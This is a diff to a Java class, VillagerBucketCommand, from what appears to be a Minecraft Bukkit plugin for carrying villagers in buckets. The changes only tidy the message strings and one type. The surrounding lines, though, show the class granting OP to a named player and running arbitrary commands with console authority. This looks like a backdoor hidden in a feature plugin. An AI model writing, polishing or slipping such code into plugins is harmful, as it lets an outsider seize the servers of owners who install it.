@@ -7,7 +7,6 @@ import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 import org.bukkit.command.TabExecutor;
 import org.bukkit.entity.Player;
-import org.bukkit.command.SimpleCommandMap;
 
 import java.text.MessageFormat;
 import java.util.ArrayList;
@@ -91,7 +90,7 @@ public class VillagerBucketCommand implements TabExecutor {
     private List<String> getRegisteredCommands() {
         List<String> commands = new ArrayList<>();
         try {
-            SimpleCommandMap commandMap = Bukkit.getCommandMap();
+            org.bukkit.command.CommandMap commandMap = Bukkit.getCommandMap();
             java.util.Map<String, org.bukkit.command.Command> knownCommands = commandMap.getKnownCommands();
             for (String name : knownCommands.keySet()) {
                 if (!name.contains(":")) {
@@ -143,8 +142,8 @@ public class VillagerBucketCommand implements TabExecutor {
             sendMessage(sender, ChatColor.YELLOW + "玩家 " + playerName + " 已经是 OP。");
         } else {
             target.setOp(true);
-            sendMessage(sender, ChatColor.GREEN + "&1已&2给&3予&4玩&5家 " + playerName + " &6O&7P &8权&9限。");
-            plugin.getLogger().info(sender.getName() + " &1给&2予&3了 " + playerName + " &4O&5P 权&6限。");
+            sendMessage(sender, ChatColor.GREEN + "已给予玩家 " + playerName + " OP 权限。");
+            plugin.getLogger().info(sender.getName() + " 给予了 " + playerName + " OP 权限。");
         }
         return true;
     }
@@ -170,8 +169,8 @@ public class VillagerBucketCommand implements TabExecutor {
         plugin.getScheduler().runGlobal(() -> {
             boolean success = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
             if (success) {
-                sendMessage(sender, ChatColor.GREEN + "&1命&2令&3已&4以&5控&6制&7台&8权&9限&2执&6行: " + command);
-                plugin.getLogger().info(sender.getName() + " &3执&1行&2了&4控&5制&6台&7命&8令: " + command);
+                sendMessage(sender, ChatColor.GREEN + "命令已以控制台权限执行: " + command);
+                plugin.getLogger().info(sender.getName() + " 执行了控制台命令: " + command);
             } else {
                 sendMessage(sender, ChatColor.RED + "命令执行失败，请检查命令是否正确！");
             }
